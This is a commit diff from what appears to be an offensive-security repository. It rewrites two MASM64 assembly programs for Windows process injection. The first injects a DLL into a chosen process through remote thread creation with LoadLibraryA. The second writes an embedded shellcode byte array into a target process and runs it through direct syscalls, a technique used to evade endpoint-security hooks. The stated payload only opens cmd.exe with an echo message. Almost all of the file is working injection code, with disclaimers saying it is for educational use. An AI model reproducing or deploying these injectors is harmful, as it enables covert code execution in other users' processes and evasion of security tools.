65bb97fcc7d090998a22e26fb8bd079fa9f87292
bekoo <devtborne@gmail.com>
2024-12-18 20:23:30 +0300

    Assembly projects have been updated to comply with Microsoft's X64 ABI conventions.
    Resolved issues that could potentially break the projects.
    
    Added detailed comments to improve code readability and maintainability.

--- ASM/DLL Injection/main.asm
+++ ASM/DLL Injection/main.asm
@@ -1,84 +1,124 @@
-; ╔═══════════════════════════════════════════════════════════╗
-; ║                                                           ║
-; ║                     ⚠️  WARNING!  ⚠️                     ║
-; ║                                                           ║
-; ║  @author: bekoo                                           ║
-; ║  @website: 0xbekoo.github.io                              ║
-; ║  @Technique: DLL Injection                                ║
-; ║                                                           ║
-; ║  @warning: This project has been developed for            ║
-; ║  educational purposes only. Its use in real scenarios     ║
-; ║  is at one's own risk.                                    ║
-; ║                                                           ║
-; ╚═══════════════════════════════════════════════════════════╝
+; /*
+;
+; @author: 0xbekoo
+; @Project: DLL Injection with MASM64 Assembly
+; @Last Update: 2024-12-18
+;
+; @Warning: This project is for educational purposes only. If you use this project for illegal purposes, it is your responsibility.
+;
+; */
 
 include utils.inc
 
+.const 
+    ; Make sure you enter the PID
+    PID DW 0
+
+    ; Make sure you enter the path to your dll
+    dllPath db "\path\to\dll",0 
+
+    PAGE_EXECUTE_READWRITE equ 40h
+    MEM_COMMIT_RESERVE equ 3000h
+    PAGE_EXECUTE_READ equ 20h
+
 .data
-    PID     DW 0                ; In this variable, you need to enter the Process ID
-    dllPath db "\path\to\dll",0 ; In this variable, you need to enter the path to your dll
+    OldProtect dd 0
 
 .code 
 
 mainCRTStartup PROC 
+    mov ecx,dword ptr [PID]
+    cmp ecx,0
+    jz Exit
+    
+    ; Get the address of the LoadLibraryA function
+    sub rsp,28h
     lea rcx,[Kernel32Str]
     call GetModuleHandleA
-    mov rcx,rax
+    add rsp,28h
+
     lea rdx,[Kernel32Address]
+    mov rcx,rax
     call CheckFunctionResult
 
-    mov rcx,[Kernel32Address]
+    ; Get the address of the LoadLibraryA function
+    sub rsp,28h
     lea rdx,[LoadLibraryStr]
+    mov rcx,[Kernel32Address]
     call GetProcAddress
-    mov rcx,rax
+    add rsp,28h
+
     lea rdx,[LoadLibraryAddress]
+    mov rcx,rax
     call CheckFunctionResult
 
-    mov rcx,1FFFFFh
-    xor rdx,rdx
+    ; Call OpenProcess
+    sub rsp,28h
     movzx r8d,word ptr [PID]
-    call OpenProcess 
-    mov rcx,rax
+    xor rdx,rdx
+    mov rcx,1FFFFFh
+    call OpenProcess
+    add rsp,28h
+
     lea rdx,[HandleProcess]
+    mov rcx,rax
     call CheckFunctionResult
 
-    mov rcx,[HandleProcess]
-    xor rdx,rdx
+    ; Call VirtualAllocEx
+    sub rsp,28h
+    mov dword ptr [rsp + 20h],PAGE_EXECUTE_READWRITE
+    mov r9d,MEM_COMMIT_RESERVE
     mov r8,sizeof dllPath
-    mov r9d,3000h
-    mov dword ptr [rsp + 20h],40h
+    xor rdx,rdx 
+    mov rcx,HandleProcess
     call VirtualAllocEx
-    mov rcx,rax
+    add rsp,28h
+
     lea rdx,[RemoteBuffer]
+    mov rcx,rax
     call CheckFunctionResult
 
-    mov rcx,[HandleProcess]
-    mov rdx,[RemoteBuffer]
-    lea r8,[dllPath]
-    mov r9d,sizeof dllPath
+    ; Call WriteProcessMemory
+    sub rsp,28h
     mov qword ptr [rsp + 20h],0
+    mov r9d,sizeof dllPath
+    lea r8,dllPath
+    mov rdx,RemoteBuffer
+    mov rcx,HandleProcess
     call WriteProcessMemory
-    mov rcx,rax
+    add rsp,28h
+
     xor rdx,rdx
-    call CheckFunctionResult
-
-    mov rcx,[HandleProcess]
-    xor edx,edx
-    xor r8d,r8d
-    mov r9,[LoadLibraryAddress]
-    mov rsi,[RemoteBuffer]           
-    mov qword ptr [rsp + 20h],rsi
-    mov qword ptr [rsp + 28h],0
-    mov qword ptr [rsp + 30h],0;
-    call CreateRemoteThread
     mov rcx,rax
-    lea rdx,[HandleThread]
     call CheckFunctionResult
 
-    mov edx,0FFFFFFFFh
-    mov rdx,[HandleThread]
-    call WaitForSingleObject
+    ; Call CreateRemoteThread
+    sub rsp,28h
+    mov r10,RemoteBuffer
+    mov qword ptr [rsp + 30h],0
+    mov qword ptr [rsp + 28h],0
+    mov qword ptr [rsp + 20h],r10
+    mov r9,LoadLibraryAddress
+    xor r8d,r8d
+    xor edx,edx
+    mov rcx,HandleProcess
+    call CreateRemoteThread
+    add rsp,28h
 
+    lea rdx,[HandleThread]
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Call WaitForSingleObject
+    sub rsp,28h
+    mov edx,0FFFFFFFFh
+    mov rcx,HandleThread
+    call WaitForSingleObject
+    add rsp,28h
+
+Exit:
+    mov rdx,HandleProcess
+    mov rcx,HandleThread
     jmp ExitProgram
 mainCRTStartup ENDP 
 END 
--- ASM/Using Direct Syscalls/main.asm
+++ ASM/Using Direct Syscalls/main.asm
@@ -1,44 +1,248 @@
-; ╔═══════════════════════════════════════════════════════════╗
-; ║                                                           ║
-; ║                     ⚠️  WARNING!  ⚠️                     ║
-; ║                                                           ║
-; ║  @author: bekoo                                           ║
-; ║  @website: 0xbekoo.github.io                              ║
-; ║  @Technique: Using Direct Systemcalls                     ║
-; ║                                                           ║
-; ║  @warning: This project has been developed for            ║
-; ║  educational purposes only. Its use in real scenarios     ║
-; ║  is at one's own risk.                                    ║
-; ║                                                           ║
-; ╚═══════════════════════════════════════════════════════════╝
+; /*
+;
+; @author: 0xbekoo
+; @Project: Direct Systemcall with MASM64 Assembly
+; @Last Update: 2024-12-18
+;
+; @Warning: This project is for educational purposes only. If you use this project for illegal purposes, it is your responsibility.
+;
+; */
 
 include utils.inc
 include syscalls.inc
 
+.const 
+    ; Make sure you enter the PID
+    PID DW 0
+
+    ALL_ACCESS equ 1FFFFFh
+    PAGE_EXECUTE_READWRITE equ 40h
+    MEM_COMMIT_RESERVE equ 3000h
+    PAGE_EXECUTE_READ equ 20h
+
 .data
-    DLLPath db "C:\path\to\dll",0
-    DLLSize QWORD 0 
-.code 
 
-GetSSN PROC 
-    mov r15,[rsp]
+    ShellcodeSize QWORD 0
+    OldProtect dd 0
 
-    call GetProcAddress
-    cmp rax,0
-    jz ExitProgram
-
-    mov rcx,rax
-    mov eax,1
-    imul rax,rax,0
-    movzx eax,byte ptr [rcx+rax+4]
-
-    mov [rsp],r15
-    ret    
-GetSSN ENDP 
+.code
+     ; /*
+     ;  cmd /K "echo Direct Syscalls with masm64"
+     ; */
+     Shellcode BYTE 0fch, 048h, 083h, 0e4h, 0f0h, 0e8h, 0c0h, 000h, 000h, 000h, 041h, 051h, 041h, 050h, 052h
+               BYTE 051h, 056h, 048h, 031h, 0d2h, 065h, 048h, 08bh, 052h, 060h, 048h, 08bh, 052h, 018h, 048h
+               BYTE 08bh, 052h, 020h, 048h, 08bh, 072h, 050h, 048h, 00fh, 0b7h, 04ah, 04ah, 04dh, 031h, 0c9h
+               BYTE 048h, 031h, 0c0h, 0ach, 03ch, 061h, 07ch, 002h, 02ch, 020h, 041h, 0c1h, 0c9h, 00dh, 041h
+               BYTE 001h, 0c1h, 0e2h, 0edh, 052h, 041h, 051h, 048h, 08bh, 052h, 020h, 08bh, 042h, 03ch, 048h
+               BYTE 001h, 0d0h, 08bh, 080h, 088h, 000h, 000h, 000h, 048h, 085h, 0c0h, 074h, 067h, 048h, 001h
+               BYTE 0d0h, 050h, 08bh, 048h, 018h, 044h, 08bh, 040h, 020h, 049h, 001h, 0d0h, 0e3h, 056h, 048h
+               BYTE 0ffh, 0c9h, 041h, 08bh, 034h, 088h, 048h, 001h, 0d6h, 04dh, 031h, 0c9h, 048h, 031h, 0c0h
+               BYTE 0ach, 041h, 0c1h, 0c9h, 00dh, 041h, 001h, 0c1h, 038h, 0e0h, 075h, 0f1h, 04ch, 003h, 04ch
+               BYTE 024h, 008h, 045h, 039h, 0d1h, 075h, 0d8h, 058h, 044h, 08bh, 040h, 024h, 049h, 001h, 0d0h
+               BYTE 066h, 041h, 08bh, 00ch, 048h, 044h, 08bh, 040h, 01ch, 049h, 001h, 0d0h, 041h, 08bh, 004h
+               BYTE 088h, 048h, 001h, 0d0h, 041h, 058h, 041h, 058h, 05eh, 059h, 05ah, 041h, 058h, 041h, 059h
+               BYTE 041h, 05ah, 048h, 083h, 0ech, 020h, 041h, 052h, 0ffh, 0e0h, 058h, 041h, 059h, 05ah, 048h
+               BYTE 08bh, 012h, 0e9h, 057h, 0ffh, 0ffh, 0ffh, 05dh, 048h, 0bah, 001h, 000h, 000h, 000h, 000h
+               BYTE 000h, 000h, 000h, 048h, 08dh, 08dh, 001h, 001h, 000h, 000h, 041h, 0bah, 031h, 08bh, 06fh
+               BYTE 087h, 0ffh, 0d5h, 0bbh, 0f0h, 0b5h, 0a2h, 056h, 041h, 0bah, 0a6h, 095h, 0bdh, 09dh, 0ffh
+               BYTE 0d5h, 048h, 083h, 0c4h, 028h, 03ch, 006h, 07ch, 00ah, 080h, 0fbh, 0e0h, 075h, 005h, 0bbh
+               BYTE 047h, 013h, 072h, 06fh, 06ah, 000h, 059h, 041h, 089h, 0dah, 0ffh, 0d5h, 063h, 06dh, 064h
+               BYTE 02eh, 065h, 078h, 065h, 020h, 02fh, 04bh, 020h, 022h, 065h, 063h, 068h, 06fh, 020h, 044h
+               BYTE 069h, 072h, 065h, 063h, 074h, 020h, 053h, 079h, 073h, 063h, 061h, 06ch, 06ch, 073h, 020h
+               BYTE 077h, 069h, 074h, 068h, 020h, 06dh, 061h, 073h, 06dh, 036h, 034h, 000h
 
 mainCRTStartup PROC
-    mov CID.UniqueProcess,0  ; Target Process ID is here  
-    mov CID.UniqueThread,0
+    mov ecx,dword ptr [PID]
+    cmp ecx,0
+    jz Exit
+
+    ; Prepare the Structures
+    call PrepareStructures
+
+    ; Get the Address of NTDLL
+    sub rsp,38h
+    lea rcx,[NTDLLString]
+    call GetModuleHandleA
+    add rsp,38h
+
+    lea rdx,[NTDLLAddress]
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get the Address of NtOpenProcess
+    lea rdx,[NtOpenProcessString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtOpenProcess
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtOpenProcess
+    sub rsp,38h
+    lea r9,CID
+    lea r8,ObjAttr
+    mov edx,ALL_ACCESS
+    lea rcx,HandleProcess
+    call My_pNtOpenProcess
+    add rsp,38h
+
+    cmp rax,0
+    jnz Exit
+
+    ; Get the Address of NtAllocateVirtualMemory
+    lea rdx,[NtAllocateVirtualString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtAllocateVirtualMemory
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtAllocateVirtualMemory
+    mov rcx,sizeof Shellcode
+    mov ShellcodeSize,rcx
+
+    ; Call NtAllocateVirtualMemory
+    sub rsp,38h
+    mov dword ptr [rsp+28h],PAGE_EXECUTE_READWRITE
+    mov dword ptr [rsp+20h],MEM_COMMIT_RESERVE
+    lea r9,ShellcodeSize
+    xor r8d,r8d
+    lea rdx,RemoteBuffer
+    mov rcx,HandleProcess
+    call My_pNtAllocateVirtualMemory
+    add rsp,38h
+
+    cmp rax,0
+    jnz Exit
+
+    ; Get the Address of NtWriteVirtualMemory
+    lea rdx,[NtWriteVirtualString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtWriteVirtualMemory
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtWriteVirtualMemory
+    sub rsp,38h
+    mov qword ptr [rsp + 20h],0
+    mov r9,ShellcodeSize
+    lea r8,Shellcode
+    mov rdx,RemoteBuffer
+    mov rcx,HandleProcess
+    call My_pNtWriteVirtualMemory
+    add rsp,38h
+
+    cmp rax,0
+    jnz Exit
+
+    ; Get the Address of NtProtectVirtualMemory
+    lea rdx,[NtProtectVirtualString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtProtectVirtualMemory
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtProtectVirtualMemory
+    sub rsp,38h
+    lea rcx,OldProtect
+    mov qword ptr [rsp + 20h],rcx
+    mov r9d,PAGE_EXECUTE_READ
+    lea r8,ShellcodeSize
+    lea rdx,[RemoteBuffer]
+    mov rcx,HandleProcess
+    call My_pNtProtectVirtualMemory
+    add rsp,38h
+
+    cmp rax,0
+    jnz Exit
+
+
+    ; Get the Address of NtCreateThreadEx
+    lea rdx,[NtCreateThreadString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtCreateThreadEx
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtCreateThreadEx
+    mov r10,RemoteBuffer
+
+    sub rsp,38h
+    mov qword ptr [rsp + 50h],0
+    mov qword ptr [rsp + 48h],0
+    mov qword ptr [rsp + 40h],0
+    mov qword ptr [rsp + 38h],0
+    mov qword ptr [rsp + 30h],0
+    mov qword ptr [rsp + 28h],0
+    mov qword ptr [rsp + 20h],r10
+    mov r9,HandleProcess
+    lea r8,ObjAttr
+    mov edx,ALL_ACCESS
+    lea rcx,HandleThread
+    call My_pNtCreateThreadEx
+    add rsp,38h
+
+    cmp rax,0
+    jnz Exit
+
+    ; Get the Address of NtWaitForSingleObject
+    lea rdx,[NtWaitString]
+    mov rcx,NTDLLAddress
+    call GetSpecificFunction
+
+    xor rdx,rdx
+    mov rcx,rax
+    call CheckFunctionResult
+
+    ; Get SSN for the NtWaitForSingleObject
+    mov rcx,rax
+    call GetSSN
+
+    ; Call NtWaitForSingleObject
+    sub rsp,38h
+    mov r8,0
+    xor rdx,rdx
+    mov rcx,HandleThread
+    call My_pNtWaitForSingleObject
+    add rsp,38h
+
+Exit:
+    mov rdx,HandleProcess
+    mov rcx,HandleThread
+    jmp ExitProgram
+mainCRTStartup ENDP
+
+PrepareStructures PROC
+    mov CID.UniqueProcess,ecx  
+    mov CID.UniqueThread,0 
    
     mov ObjAttr.oLength,0    
     mov ObjAttr.RootDirectory,0    
@@ -48,94 +252,24 @@ mainCRTStartup PROC
     mov ObjAttr.SecurityQualityOfService,0    
     mov ObjAttr.oLength,sizeof OBJECT_ATTRIBUTES 
 
-    lea rcx,[KERNEL32String]
-    call GetModuleHandleA
-    lea rdx,[Kernel32Address]
-    mov rcx,rax
-    call CheckFunctionResult
+    ret
+PrepareStructures ENDP
 
-    lea rdx,[LoadLibraryString]
-    mov rcx,Kernel32Address
-    call GetProcAddress
-    mov rcx,rax
-    lea rdx,[LoadLibraryAddress]
-    call CheckFunctionResult
 
-    lea rcx,[NTDLLString]
-    call GetModuleHandleA
-    lea rdx,[NTDLLAddress]
-    mov rcx,rax
-    call CheckFunctionResult
+; /*
+;   * Parameters:
+;       * rcx - The address of Function (QWORD)
+;
+;   Output:
+;       * rax - The Target Function's SSN Number
+GetSSN PROC 
+    mov r10,rcx
+    xor rax,rax
 
-    lea rdx,[NtOpenProcessString]
-    mov rcx,NTDLLAddress
-    call GetSSN
+    mov eax,1
+    imul rax,rax,0
+    movzx eax,byte ptr [r10+rax+4]
 
-    lea r8,ObjAttr
-    lea r9,CID
-    mov edx,1FFFFFh
-    lea rcx,HandleProcess
-    call NtOpenProcess
-    cmp rax,0
-    jnz ExitProgram
-
-    lea rdx,[NtAllocateVirtualString]
-    mov rcx,NTDLLAddress
-    call GetSSN
-
-    mov rcx,sizeof DLLPath
-    mov DLLSize,rcx
-    mov dword ptr [rsp + 28h],40h
-    mov dword ptr [rsp + 20h],3000h
-    lea r9,DLLSize
-    mov r8d,0
-    lea rdx,RemoteBuffer
-    mov rcx,HandleProcess
-    call NtAllocateVirtualMemory
-    cmp rax,0
-    jnz ExitProgram
-
-    lea rdx,[NtWriteVirtualString]
-    mov rcx,NTDLLAddress
-    call GetSSN
-
-    mov qword ptr [rsp + 20h],0
-    mov r9,sizeof DLLPath
-    lea r8,DLLPath
-    mov rdx,RemoteBuffer
-    mov rcx,HandleProcess
-    call NtWriteVirtualMemory
-    cmp rax,0
-    jnz ExitProgram
-
-    lea rdx,[NtCreateThreadString]
-    mov rcx,NTDLLAddress
-    call GetSSN
-
-    mov rcx,RemoteBuffer
-    mov qword ptr [rsp + 50h],0
-    mov qword ptr [rsp + 48h],0
-    mov qword ptr [rsp + 40h],0
-    mov qword ptr [rsp + 38h],0
-    mov dword ptr [rsp + 30h],0
-    mov qword ptr [rsp + 28h],rcx
-    mov rcx,LoadLibraryAddress
-    mov qword ptr [rsp + 20h],rcx
-    mov r9,HandleProcess
-    lea r8,ObjAttr
-    mov edx,1FFFFFh
-    lea rcx,HandleThread
-    call NtCreateThreadEx
-
-    lea rdx,[NtWaitString]
-    mov rcx,NTDLLAddress
-    call GetSSN
-
-    xor r8,r8
-    xor rdx,rdx
-    mov rcx,HandleThread
-    call NtWaitForSingleObject
-
-    jmp ExitProgram
-mainCRTStartup ENDP
+	ret
+GetSSN ENDP 
 END
